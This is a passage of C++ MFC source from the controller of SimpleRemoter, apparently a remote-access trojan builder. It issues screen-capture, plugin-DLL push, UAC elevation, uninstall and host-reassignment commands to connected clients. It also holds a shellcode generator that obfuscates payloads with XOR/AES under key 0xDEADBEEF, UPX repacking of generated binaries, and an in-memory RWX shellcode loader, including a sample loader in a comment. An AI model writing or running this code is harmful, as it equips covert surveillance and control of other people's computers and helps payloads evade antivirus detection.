		outFile.open(filePath, std::ios::binary | std::ios::out | std::ios::app);
	}
	else {
		// 非0偏移，保留原内容，定位写入
		outFile.open(filePath, std::ios::binary | std::ios::in | std::ios::out);

		// 文件不存在时创建
		if (!outFile) {
			outFile.open(filePath, std::ios::binary | std::ios::out);
		}
	}

	if (!outFile) {
		Mprintf("Failed to open or create the file: %s.\n", filePath.c_str());
		return FALSE;
	}

	// 追加模式不需要 seekp, 其他情况定位到指定位置
    if (offset != -1) {
        // 定位到指定位置
        outFile.seekp(offset, std::ios::beg);

        // 验证 seekp 是否成功
        if (outFile.fail()) {
            Mprintf("Failed to seek to offset %llu.\n", offset);
            outFile.close();
            return FALSE;
        }
    }

	// 写入二进制数据
	outFile.write(data, size);

	if (outFile.good()) {
		Mprintf("Binary data written successfully to %s.\n", filePath.c_str());
	}
	else {
		Mprintf("Failed to write data to file.\n");
		outFile.close();
		return FALSE;
	}

	outFile.close();
	return TRUE;
}

int run_cmd(std::string cmdLine)
{
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };
    BOOL success = CreateProcessA(
                       NULL,
                       &cmdLine[0],  // 注意必须是非 const char*
                       NULL, NULL, FALSE,
                       0, NULL, NULL, &si, &pi
                   );

    if (!success) {
        Mprintf("Failed to run UPX. Error: %d\n", GetLastError());
        return -1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    SAFE_CLOSE_HANDLE(pi.hProcess);
    SAFE_CLOSE_HANDLE(pi.hThread);

    return static_cast<int>(exitCode);
}

int run_upx(const std::string& upx, const std::string &file, bool isCompress)
{
    std::string cmd = isCompress ? "\" --best \"" : "\" -d \"";
    std::string cmdLine = "\"" + upx + cmd + file + "\"";
    return run_cmd(cmdLine);
}

std::string ReleaseUPX()
{
    return ReleaseEXE(IDR_BINARY_UPX, "upx.exe");
}

// 解压UPX对当前应用程序进行操作
bool UPXUncompressFile(const std::string& upx, std::string &file)
{
    char path[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string curExe = path;

    if (!upx.empty()) {
        file = curExe + ".tmp";
        if (!CopyFile(curExe.c_str(), file.c_str(), FALSE)) {
            Mprintf("Failed to copy file. Error: %d\n", GetLastError());
            return false;
        }
        int result = run_upx(upx, file, false);
        Mprintf("UPX decompression %s!\n", result ? "failed" : "successful");
        return 0 == result;
    }
    return false;
}

struct UpxTaskArgs {
    HWND hwnd; // 主窗口句柄
    std::string upx;
    std::string file;
    bool isCompress;
};

DWORD WINAPI UpxThreadProc(LPVOID lpParam)
{
    UpxTaskArgs* args = (UpxTaskArgs*)lpParam;
    int result = run_upx(args->upx, args->file, args->isCompress);

    // 向主线程发送完成消息，wParam可传结果
    PostMessageA(args->hwnd, WM_UPXTASKRESULT, (WPARAM)result, 0);

    DeleteFile(args->upx.c_str());
    delete args;

    return 0;
}

void run_upx_async(HWND hwnd, const std::string& upx, const std::string& file, bool isCompress)
{
    UpxTaskArgs* args = new UpxTaskArgs{ hwnd, upx, file, isCompress };
    CloseHandle(CreateThread(NULL, 0, UpxThreadProc, args, 0, NULL));
}

LRESULT CMy2015RemoteDlg::UPXProcResult(WPARAM wParam, LPARAM lParam)
{
    int exitCode = static_cast<int>(wParam);
    ShowMessage(exitCode == 0 ? "操作成功":"操作失败", "UPX 处理完成");
    return S_OK;
}

//////////////////////////////////////////////////////////////////////////

void CMy2015RemoteDlg::OnToolGenMaster()
{
    // 主控程序公网IP
    std::string master = THIS_CFG.GetStr("settings", "master", "");
    if (master.empty())	{
        MessageBox("请通过菜单设置当前主控程序的公网地址（域名）! 此地址会写入即将生成的主控程序中。"
                   "\n只有正确设置公网地址，才能在线延长由本程序所生成的主控程序的有效期。", "提示", MB_ICONINFORMATION);
    }
    std::string masterHash(GetMasterHash());
    if (m_superPass.empty()) {
        CInputDialog pass(this);
        pass.Init("主控生成", "当前主控程序的密码:");
        pass.m_str = m_superPass.c_str();
        if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
            return;
        if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
            MessageBox("密码不正确，无法生成主控程序!", "错误", MB_ICONWARNING);
            return;
        }
        m_superPass = pass.m_str.GetString();
    }

    CInputDialog dlg(this);
    dlg.Init("主控密码", "新的主控程序的密码:");
    if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
        return;
    if (dlg.m_str.GetLength() > 15) {
        MessageBox("密码长度不能大于15。", "错误", MB_ICONWARNING);
        return;
    }
    CInputDialog days(this);
    days.Init("使用天数", "新主控程序使用天数:");
    if (days.DoModal() != IDOK || days.m_str.IsEmpty())
        return;
    size_t size = 0;
    char path[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (len == 0 || len == MAX_PATH) {
        return;
    }
    char* curEXE = ReadFileToBuffer(path, size);
    if (curEXE == nullptr) {
        MessageBox("读取文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
        return;
    }
    std::string pwdHash = hashSHA256(dlg.m_str.GetString());
    int iOffset = MemoryFind(curEXE, masterHash.c_str(), size, masterHash.length());
    std::string upx = ReleaseUPX();
    if (iOffset == -1) {
        SAFE_DELETE_ARRAY(curEXE);
        std::string tmp;
        if (!UPXUncompressFile(upx, tmp) || nullptr == (curEXE = ReadFileToBuffer(tmp.c_str(), size))) {
            MessageBox("操作文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
            if (!upx.empty()) DeleteFile(upx.c_str());
            if (!tmp.empty()) DeleteFile(tmp.c_str());
            return;
        }
        DeleteFile(tmp.c_str());
        iOffset = MemoryFind(curEXE, masterHash.c_str(), size, masterHash.length());
        if (iOffset == -1) {
            SAFE_DELETE_ARRAY(curEXE);
            MessageBox("操作文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
            return;
        }
    }
    int port = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
    std::string id = genHMAC(pwdHash, m_superPass);
    Validation verify(atof(days.m_str), master.c_str(), port<=0 ? 6543 : port, id.c_str());
    if (!WritePwdHash(curEXE + iOffset, pwdHash, verify)) {
        MessageBox("写入哈希失败! 无法生成主控。", "错误", MB_ICONWARNING);
        SAFE_DELETE_ARRAY(curEXE);
        return;
    }
    CComPtr<IShellFolder> spDesktop;
    HRESULT hr = SHGetDesktopFolder(&spDesktop);
    if (FAILED(hr)) {
        MessageBox("Explorer 未正确初始化! 请稍后再试。", "提示");
        SAFE_DELETE_ARRAY(curEXE);
        return;
    }
    // 过滤器：显示所有文件和特定类型文件（例如文本文件）
    CFileDialog fileDlg(FALSE, _T("exe"), "YAMA.exe", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
                        _T("EXE Files (*.exe)|*.exe|All Files (*.*)|*.*||"), AfxGetMainWnd());
    int ret = 0;
    try {
        ret = fileDlg.DoModal();
    } catch (...) {
        MessageBox("文件对话框未成功打开! 请稍后再试。", "提示");
        SAFE_DELETE_ARRAY(curEXE);
        return;
    }
    if (ret == IDOK) {
        CString name = fileDlg.GetPathName();
        CFile File;
        BOOL r = File.Open(name, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
        if (!r) {
            MessageBox("主控程序创建失败!\r\n" + name, "提示", MB_ICONWARNING);
            SAFE_DELETE_ARRAY(curEXE);
            return;
        }
        File.Write(curEXE, size);
        File.Close();
        if (!upx.empty()) {
#ifndef _DEBUG // DEBUG 模式用UPX压缩的程序可能无法正常运行
            run_upx_async(GetSafeHwnd(), upx, name.GetString(), true);
            MessageBox("正在UPX压缩，请关注信息提示。\r\n文件位于: " + name, "提示", MB_ICONINFORMATION);
#endif
        } else
            MessageBox("生成成功! 文件位于:\r\n" + name, "提示", MB_ICONINFORMATION);
    }
    SAFE_DELETE_ARRAY(curEXE);
}


void CMy2015RemoteDlg::OnHelpImportant()
{
    const char* msg =
        "本软件以“现状”提供，不附带任何保证。使用本软件的风险由用户自行承担。"
        "我们不对任何因使用本软件而引发的非法或恶意用途负责。用户应遵守相关法律"
        "法规，并负责任地使用本软件。开发者对任何因使用本软件产生的损害不承担责任。";
    MessageBox(msg, "免责声明", MB_ICONINFORMATION);
}


void CMy2015RemoteDlg::OnHelpFeedback()
{
    CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/issues/new");
    ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
}

void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID)
{
    if (m_DllList.size() == 0) {
        MessageBoxA("请将64位的DLL放于主控程序的 'Plugins' 目录，再来点击此项菜单。"
                    "\n执行未经测试的代码可能造成程序崩溃。", "提示", MB_ICONINFORMATION);
        char path[_MAX_PATH];
        GetModuleFileNameA(NULL, path, _MAX_PATH);
        GET_FILEPATH(path, "Plugins");
        m_DllList = ReadAllDllFilesWindows(path);
        return;
    }
    int menuIndex = nID - ID_DYNAMIC_MENU_BASE;  // 计算菜单项的索引（基于 ID）
    EnterCriticalSection(&m_cs);
    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
    while (Pos && menuIndex < m_DllList.size()) {
        Buffer* buf = m_DllList[menuIndex]->Data;
        int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
        context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
        ContextObject->Send2Client( buf->Buf(), 1 + sizeof(DllExecuteInfo) );
    }
    LeaveCriticalSection(&m_cs);
}
void CMy2015RemoteDlg::OnOnlineVirtualDesktop()
{
    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 2, ALGORITHM_DIFF, THIS_CFG.GetInt("settings", "MultiScreen") };
    SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnOnlineGrayDesktop()
{
    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_GRAY, THIS_CFG.GetInt("settings", "MultiScreen") };
    SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnOnlineRemoteDesktop()
{
    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 1, ALGORITHM_DIFF, THIS_CFG.GetInt("settings", "MultiScreen") };
    SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnOnlineH264Desktop()
{
    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_H264, THIS_CFG.GetInt("settings", "MultiScreen") };
    SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnWhatIsThis()
{
    CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/wiki");
    ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
}


void CMy2015RemoteDlg::OnOnlineAuthorize()
{
    if (m_superPass.empty()) {
        CInputDialog pass(this);
        pass.Init("需要密码", "当前主控程序的密码:");
        if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
            return;
        std::string masterHash(GetMasterHash());
        if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
            MessageBox("密码不正确!", "错误", MB_ICONWARNING);
            return;
        }
        m_superPass = pass.m_str;
    }

    CInputDialog dlg(this);
    dlg.Init("延长授权", "主控程序授权天数:");
    dlg.Init2("并发上线机器数量:", std::to_string(100).c_str());
    if (dlg.DoModal() != IDOK || atoi(dlg.m_str) <= 0)
        return;
    BYTE	bToken[32] = { CMD_AUTHORIZATION };
    unsigned short days = atoi(dlg.m_str);
    unsigned short num = atoi(dlg.m_sSecondInput);
    uint32_t tm = clock();
    // 2字节天数+2字节主机数+4字节时间戳+消息签名
    memcpy(bToken+1, &days, sizeof(days));
    memcpy(bToken+3, &num, sizeof(num));
    memcpy(bToken + 8, &tm, sizeof(tm));
    uint64_t signature = SignMessage(m_superPass, bToken, 12);
    memcpy(bToken + 12, &signature, sizeof(signature));
    SendSelectedCommand(bToken, sizeof(bToken));
}

void CMy2015RemoteDlg::OnListClick(NMHDR* pNMHDR, LRESULT* pResult)
{
    LPNMITEMACTIVATE pNMItem = (LPNMITEMACTIVATE)pNMHDR;

    if (pNMItem->iItem >= 0) {
        // 获取数据
        context* ctx = (context*)m_CList_Online.GetItemData(pNMItem->iItem);
        CString res[RES_MAX];
        CString startTime = ctx->GetClientData(ONLINELIST_LOGINTIME);
        ctx->GetAdditionalData(res);
        FlagType type = ctx->GetFlagType();
        static std::map<FlagType, std::string> typMap = {
            {FLAG_WINOS, "WinOS"}, {FLAG_UNKNOWN, "Unknown"}, {FLAG_SHINE, "Shine"},
            {FLAG_FUCK, "FUCK"}, {FLAG_HELLO, "Hello"}, {FLAG_HELL, "HELL"},
        };

        // 拼接内容
        CString strText;
        std::string expired = res[RES_EXPIRED_DATE];
        expired = expired.empty() ? "" : " Expired on " + expired;
        strText.Format(_T("文件路径: %s%s %s\r\n系统信息: %s 位 %s 核心 %s GB\r\n启动信息: %s %s %s%s\r\n上线信息: %s %d %s"),
                       res[RES_PROGRAM_BITS].IsEmpty() ? "" : res[RES_PROGRAM_BITS] + " 位 ", res[RES_FILE_PATH], res[RES_EXE_VERSION],
                       res[RES_SYSTEM_BITS], res[RES_SYSTEM_CPU], res[RES_SYSTEM_MEM], startTime, expired.c_str(),
                       res[RES_USERNAME], res[RES_ISADMIN] == "1" ? "[管理员]" : res[RES_ISADMIN].IsEmpty() ? "" : "[非管理员]",
                       ctx->GetProtocol().c_str(), ctx->GetServerPort(), typMap[type].c_str());

        // 获取鼠标位置
        CPoint pt;
        GetCursorPos(&pt);

        // 清理旧提示
        DeletePopupWindow();

        // 创建提示窗口
        m_pFloatingTip = new CWnd();
        int width = res[RES_FILE_PATH].GetLength() * 10 + 36;
        width = min(max(width, 360), 800);
        CRect rect(pt.x, pt.y, pt.x + width, pt.y + 80); // 宽度、高度

        BOOL bOk = m_pFloatingTip->CreateEx(
                       WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
                       _T("STATIC"),
                       strText,
                       WS_POPUP | WS_VISIBLE | WS_BORDER | SS_LEFT | SS_NOTIFY,
                       rect,
                       this,
                       0);

        if (bOk) {
            m_pFloatingTip->SetFont(GetFont());
            m_pFloatingTip->ShowWindow(SW_SHOW);
            SetTimer(TIMER_CLOSEWND, 5000, nullptr);
        } else {
            SAFE_DELETE(m_pFloatingTip);
        }
    }

    *pResult = 0;
}


void CMy2015RemoteDlg::OnOnlineUnauthorize()
{
    if (m_superPass.empty()) {
        CInputDialog pass(this);
        pass.Init("需要密码", "当前主控程序的密码:");
        if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
            return;
        std::string masterHash(GetMasterHash());
        if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
            MessageBox("密码不正确!", "错误", MB_ICONWARNING);
            return;
        }
        m_superPass = pass.m_str;
    }

    BYTE	bToken[32] = { CMD_AUTHORIZATION };
    unsigned short days = 0;
    unsigned short num = 1;
    uint32_t tm = clock();
    // 2字节天数+2字节主机数+4字节时间戳+消息签名
    memcpy(bToken + 1, &days, sizeof(days));
    memcpy(bToken + 3, &num, sizeof(num));
    memcpy(bToken + 8, &tm, sizeof(tm));
    uint64_t signature = SignMessage(m_superPass, bToken, 12);
    memcpy(bToken + 12, &signature, sizeof(signature));
    SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnToolRequestAuth()
{
    std::string pwd = THIS_CFG.GetStr("settings", "Password");
    BOOL noPwd = pwd.empty();
    if (noPwd && IDYES != MessageBoxA("本软件仅限于合法、正当、合规的用途。\r\n您是否同意？",
                                      "声明", MB_ICONQUESTION | MB_YESNO))
        return;
    CInputDialog dlg(this);
    dlg.m_str = getDeviceID(GetHardwareID()).c_str();
    dlg.Init(noPwd ? "请求授权" : "序列号", "序列号(唯一ID):");
    if (!noPwd)
        dlg.Init2("授权口令:", pwd.c_str());
    if (IDOK == dlg.DoModal() && noPwd) {
        CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/wiki#请求授权");
        ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
    }
}


void CMy2015RemoteDlg::OnToolInputPassword()
{
    if (CheckValid(-1)) {
        CString pwd = THIS_CFG.GetStr("settings", "Password", "").c_str();
        auto v = splitString(pwd.GetBuffer(), '-');
        CString info;
        info.Format("软件有效期限: %s — %s, 并发连接数量: %d.", v[0].c_str(), v[1].c_str(), atoi(v[2].c_str()));
        if (IDYES == MessageBoxA(info + "\n如需修改授权信息，请联系管理员。是否现在修改授权？", "提示", MB_YESNO | MB_ICONINFORMATION)) {
            CInputDialog dlg(this);
            dlg.m_str = pwd;
            dlg.Init("更改口令", "请输入新的口令:");
            dlg.Init2("校验码 (HMAC):", THIS_CFG.GetStr("settings", "PwdHmac", "").c_str());
            if (dlg.DoModal() == IDOK) {
                THIS_CFG.SetStr("settings", "Password", dlg.m_str.GetString());
                THIS_CFG.SetStr("settings", "PwdHmac", dlg.m_sSecondInput.GetString());
#ifdef _DEBUG
                SetTimer(TIMER_CHECK, 10 * 1000, NULL);
#else
                SetTimer(TIMER_CHECK, 600 * 1000, NULL);
#endif
            }
        }
    }
}

bool safe_exec(void *exec)
{
    __try {
        ((void(*)())exec)();
        return true;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        VirtualFree(exec, 0, MEM_RELEASE);
    }
    return false;
}

/* Example: <Select TinyRun.dll to build "tinyrun.c">
#include "tinyrun.c"
#include <windows.h>
#include <stdio.h>

int main() {
	void* exec = VirtualAlloc(NULL,Shellcode_len,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	if (exec) {
		memcpy(exec, Shellcode, Shellcode_len);
		((void(*)())exec)();
		Sleep(INFINITE);
	}
	return 0;
}
*/
#include "common/obfs.h"
void shellcode_process(ObfsBase *obfs, bool load = false, const char* suffix = ".c")
{
    CFileDialog fileDlg(TRUE, NULL, NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
                        _T("DLL Files (*.dll)|*.dll|BIN Files (*.bin)|*.bin|All Files (*.*)|*.*||"), AfxGetMainWnd());
    int ret = 0;
    try {
        ret = fileDlg.DoModal();
    } catch (...) {
        AfxMessageBox("文件对话框未成功打开! 请稍后再试。", MB_ICONWARNING);
        return;
    }
    if (ret == IDOK) {
        CString name = fileDlg.GetPathName();
        CFile File;
        BOOL r = File.Open(name, CFile::typeBinary | CFile::modeRead);
        if (!r) {
            AfxMessageBox("文件打开失败! 请稍后再试。\r\n" + name, MB_ICONWARNING);
            return;
        }
        int dwFileSize = File.GetLength();
        int padding = ALIGN16(dwFileSize) - dwFileSize;
        LPBYTE szBuffer = new BYTE[dwFileSize + padding];
        memset(szBuffer + dwFileSize, 0, padding);
        File.Read(szBuffer, dwFileSize);
        File.Close();

        LPBYTE srcData = NULL;
        int srcLen = 0;
        if (load) {
            const uint32_t key = 0xDEADBEEF;
            obfs->DeobfuscateBuffer(szBuffer, dwFileSize, key);
            void* exec = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (exec) {
                memcpy(exec, szBuffer, dwFileSize);
                if (safe_exec(exec)) {
                    AfxMessageBox("Shellcode 执行成功! ", MB_ICONINFORMATION);
                } else {
                    AfxMessageBox("Shellcode 执行失败! 请用本程序生成的 bin 文件进行测试! ", MB_ICONERROR);
                }
            }
        } else if (MakeShellcode(srcData, srcLen, (LPBYTE)szBuffer, dwFileSize, true)) {
            TCHAR buffer[MAX_PATH];
            _tcscpy_s(buffer, name);
            PathRemoveExtension(buffer);
            const uint32_t key = 0xDEADBEEF;
            obfs->ObfuscateBuffer(srcData, srcLen, key);
            if (obfs->WriteFile(CString(buffer) + suffix, srcData, srcLen, "Shellcode")) {
                AfxMessageBox("Shellcode 生成成功! 请自行编写调用程序。\r\n" + CString(buffer) + suffix,
                              MB_ICONINFORMATION);
            }
        }
        SAFE_DELETE_ARRAY(srcData);
        SAFE_DELETE_ARRAY(szBuffer);
    }
}

void CMy2015RemoteDlg::OnToolGenShellcode()
{
    ObfsBase obfs;
    shellcode_process(&obfs);
}

void CMy2015RemoteDlg::OnObfsShellcode()
{
    Obfs obfs;
    shellcode_process(&obfs);
}

void CMy2015RemoteDlg::OnShellcodeAesCArray()
{
    ObfsAes obfs;
    shellcode_process(&obfs);
}


void CMy2015RemoteDlg::OnToolGenShellcodeBin()
{
    ObfsBase obfs(false);
    shellcode_process(&obfs, false, ".bin");
}

void CMy2015RemoteDlg::OnObfsShellcodeBin()
{
    Obfs obfs(false);
    shellcode_process(&obfs, false,  ".bin");
}


void CMy2015RemoteDlg::OnShellcodeLoadTest()
{
    if (MessageBox(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
                           "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。",
                           "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
        ObfsBase obfs;
        shellcode_process(&obfs, true);
    }
}


void CMy2015RemoteDlg::OnShellcodeObfsLoadTest()
{
    if (MessageBox(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
                           "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。",
                           "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
        Obfs obfs;
        shellcode_process(&obfs, true);
    }
}


void CMy2015RemoteDlg::OnShellcodeAesBin()
{
    ObfsAes obfs(false);
    shellcode_process(&obfs, false, ".bin");
}


void CMy2015RemoteDlg::OnShellcodeTestAesBin()
{
    if (MessageBox(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
                           "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。",
                           "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
        ObfsAes obfs;
        shellcode_process(&obfs, true);
    }
}

void CMy2015RemoteDlg::OnOnlineAssignTo()
{
    CInputDialog dlg(this);
    dlg.Init("转移主机(到期自动复原)", "输入<IP:PORT>地址:");
    dlg.Init2("天数(支持浮点数):", "30");
    if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty() || atof(dlg.m_sSecondInput.GetString())<=0)
        return;
    if (dlg.m_str.GetLength() >= 250) {
        MessageBox("字符串长度超出[0, 250]范围限制!", "提示", MB_ICONINFORMATION);
        return;
    }
    if (dlg.m_sSecondInput.GetLength() >= 6) {
        MessageBox("超出使用时间可输入的字符数限制!", "提示", MB_ICONINFORMATION);
        return;
    }
    CharMsg* buf1 = new CharMsg(dlg.m_str.GetLength() + 1);
    CharMsg* buf2 = new CharMsg(dlg.m_sSecondInput.GetLength() + 1);
    memcpy(buf1->data, dlg.m_str, dlg.m_str.GetLength());
    memcpy(buf2->data, dlg.m_sSecondInput, dlg.m_sSecondInput.GetLength());
    buf1->data[dlg.m_str.GetLength()] = 0;
    buf2->data[dlg.m_sSecondInput.GetLength()] = 0;
    PostMessageA(WM_ASSIGN_CLIENT, (WPARAM)buf1, (LPARAM)buf2);
}

LRESULT CMy2015RemoteDlg::assignFunction(WPARAM wParam, LPARAM lParam, BOOL all)
{
    CharMsg* buf1 = (CharMsg*)wParam, *buf2 = (CharMsg*)lParam;
    int len1 = strlen(buf1->data), len2 = strlen(buf2->data);
    BYTE bToken[_MAX_PATH] = { COMMAND_ASSIGN_MASTER };
    // 目标主机类型
    bToken[1] = SHARE_TYPE_YAMA_FOREVER;
    memcpy(bToken + 2, buf1->data, len1);
    bToken[2 + len1] = ':';
    memcpy(bToken + 2 + len1 + 1, buf2->data, len2);
    all ? SendAllCommand(bToken, sizeof(bToken)) : SendSelectedCommand(bToken, sizeof(bToken));
    if(buf1->needFree) delete buf1;
    if(buf2->needFree) delete buf2;
    return S_OK;
}

LRESULT CMy2015RemoteDlg::AssignClient(WPARAM wParam, LPARAM lParam)
{
    return assignFunction(wParam, lParam, FALSE);
}

LRESULT CMy2015RemoteDlg::AssignAllClient(WPARAM wParam, LPARAM lParam)
{
    return assignFunction(wParam, lParam, TRUE);
}

void CMy2015RemoteDlg::OnNMCustomdrawMessage(NMHDR* pNMHDR, LRESULT* pResult)
{
    LPNMLVCUSTOMDRAW pLVCD = reinterpret_cast<LPNMLVCUSTOMDRAW>(pNMHDR);
    *pResult = 0;

    switch (pLVCD->nmcd.dwDrawStage) {
    case CDDS_PREPAINT:
        *pResult = CDRF_NOTIFYITEMDRAW;
        return;

    case CDDS_ITEMPREPAINT: {
        int nRow = static_cast<int>(pLVCD->nmcd.dwItemSpec);
        int nLastRow = m_CList_Message.GetItemCount() - 1;
        if (nRow == nLastRow && nLastRow >= 0) {
            pLVCD->clrText = RGB(255, 0, 0);
        }
    }
    }
}


void CMy2015RemoteDlg::OnOnlineAddWatch()
{
    EnterCriticalSection(&m_cs);
    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
    while (Pos) {
        int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
        context* ctx = (context*)m_CList_Online.GetItemData(iItem);
        auto f = m_ClientMap.find(ctx->GetClientID());
        int r = f != m_ClientMap.end() ? f->second.GetLevel() : 0;
        m_ClientMap[ctx->GetClientID()].UpdateLevel(++r >= 4 ? 0 : r);
    }
    SaveToFile(m_ClientMap, GetDbPath());
    LeaveCriticalSection(&m_cs);
}


void CMy2015RemoteDlg::OnNMCustomdrawOnline(NMHDR* pNMHDR, LRESULT* pResult)
{
    LPNMLVCUSTOMDRAW pLVCD = reinterpret_cast<LPNMLVCUSTOMDRAW>(pNMHDR);
    *pResult = 0;

    switch (pLVCD->nmcd.dwDrawStage) {
    case CDDS_PREPAINT:
        *pResult = CDRF_NOTIFYITEMDRAW;
        return;

    case CDDS_ITEMPREPAINT: {
        int nRow = static_cast<int>(pLVCD->nmcd.dwItemSpec);
        EnterCriticalSection(&m_cs);
        context* ctx = (context*)m_CList_Online.GetItemData(nRow);
        auto f = m_ClientMap.find(ctx->GetClientID());
        int r = f != m_ClientMap.end() ? f->second.GetLevel() : 0;
        LeaveCriticalSection(&m_cs);
        if (r >= 1) pLVCD->clrText = RGB(0, 0, 255); // 字体蓝
        if (r >= 2) pLVCD->clrText = RGB(255, 0, 0); // 字体红
        if (r >= 3) pLVCD->clrTextBk = RGB(255, 160, 160); // 背景红
    }
    }
}


void CMy2015RemoteDlg::OnOnlineRunAsAdmin()
{
    if (MessageBoxA("确定要以管理员权限重新启动目标应用程序吗?\n此操作可能触发 UAC 账户控制。",
                    "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
        EnterCriticalSection(&m_cs);
        POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
        while (Pos) {
            int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
            context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
            BYTE token = CMD_RUNASADMIN;
            ContextObject->Send2Client(&token, sizeof(token));
        }
        LeaveCriticalSection(&m_cs);
    }
}


void CMy2015RemoteDlg::OnMainWallet()
{
    CWalletDlg dlg(this);
    dlg.m_str = CString(m_settings.WalletAddress);
    if (dlg.DoModal() != IDOK || CString(m_settings.WalletAddress) == dlg.m_str)
        return;
    if (dlg.m_str.GetLength() > 470) {
        MessageBox("超出钱包地址可输入的字符数限制!", "提示", MB_ICONINFORMATION);
        return;
    }
    strcpy(m_settings.WalletAddress, dlg.m_str);
    THIS_CFG.SetStr("settings", "wallet", m_settings.WalletAddress);
    SendMasterSettings(nullptr);
}


void CMy2015RemoteDlg::OnToolRcedit()
{
    CRcEditDlg dlg;
    dlg.DoModal();
}


void CMy2015RemoteDlg::OnOnlineUninstall()
{
    if (IDYES != MessageBox(_T("确定卸载选定的被控程序吗?"), _T("提示"), MB_ICONQUESTION | MB_YESNO))
        return;

    BYTE bToken = TOKEN_UNINSTALL;
    SendSelectedCommand(&bToken, sizeof(BYTE));

    EnterCriticalSection(&m_cs);
    int iCount = m_CList_Online.GetSelectedCount();
    for (int i = 0; i < iCount; ++i) {
        POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
        int iItem = m_CList_Online.GetNextSelectedItem(Pos);
        CString strIP = m_CList_Online.GetItemText(iItem, ONLINELIST_IP);
        context* ctx = (context*)m_CList_Online.GetItemData(iItem);
        m_CList_Online.DeleteItem(iItem);
        m_HostList.erase(ctx);
        auto tm = ctx->GetAliveTime();
        std::string aliveInfo = tm >= 86400 ? floatToString(tm / 86400.f) + " d" :
                                tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
                                tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
        ctx->Destroy();
        strIP += "断开连接";
        ShowMessage("操作成功", strIP + "[" + aliveInfo.c_str() + "]");
    }
    LeaveCriticalSection(&m_cs);
}


void CMy2015RemoteDlg::OnOnlinePrivateScreen()
{
    std::string masterId = GetPwdHash(), hmac = GetHMAC();

    BYTE bToken[101] = { TOKEN_PRIVATESCREEN };
    memcpy(bToken + 1, masterId.c_str(), masterId.length());
    memcpy(bToken + 1 + masterId.length(), hmac.c_str(), hmac.length());
    SendSelectedCommand(bToken, sizeof(bToken));
}

void CMy2015RemoteDlg::LoadListData(const std::string& group)
{
    m_CList_Online.DeleteAllItems();
    int iCount = 0;
    for (auto& ctx : m_HostList) {
        auto g = ctx->GetGroupName();
        if ((group == _T("default") && g.empty()) || g == group) {
            CString strIP=ctx->GetClientData(ONLINELIST_IP);
            auto& m = m_ClientMap[ctx->GetClientID()];
